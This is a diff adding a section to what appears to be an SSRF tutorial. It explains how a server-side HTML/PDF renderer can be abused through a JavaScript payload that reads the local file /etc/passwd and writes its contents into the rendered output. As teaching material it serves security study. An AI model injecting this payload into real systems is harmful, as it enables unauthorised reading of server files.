@@ -88,6 +88,30 @@ You can manipulate the URL scheme to provoke further unexpected behavior. Since 
 
 ![lfi](../../../../images/ssrf_7.png)
 
+### Combining with JavaScript
+
+You can combine SSRF with **server-side JavaScript execution** to extend the attack beyond simple HTTP requests. For instance, when a web application renders user-supplied HTML or PDF content using a server-side engine that executes JavaScript, you can craft a payload that reads local files:
+
+```js
+<script>
+x = new XMLHttpRequest;
+x.onload = function() {
+    document.write(this.responseText)
+};
+x.open('GET','file:///etc/passwd');
+x.send();
+</script>
+```
+
+**How it works**:
+
+1. The payload is executed **server-side** in the PDF/HTML rendering engine.
+2. `XMLHttpRequest` fetches a **local file** (`file:///etc/passwd`) from the server.
+3. `document.write` injects the file contents into the rendered document.
+4. When the PDF or HTML is returned, you receive the sensitive data.
+
+This is effectively **SSRF → Local File Read** using JavaScript, leveraging the fact that server-side renderers are not restricted by browser security policies like the same-origin policy.
+
 ## gopher Protocol
 
 You can use SSRF to access restricted internal endpoints. However, you are restricted to GET requests as there is no way to send a POST request with the ```http://``` URL scheme. For instance, consider a different version of the previous web application. Assuming you identified the internal endpoint ```admin.php``` just like before, however, this time the response looks like this:
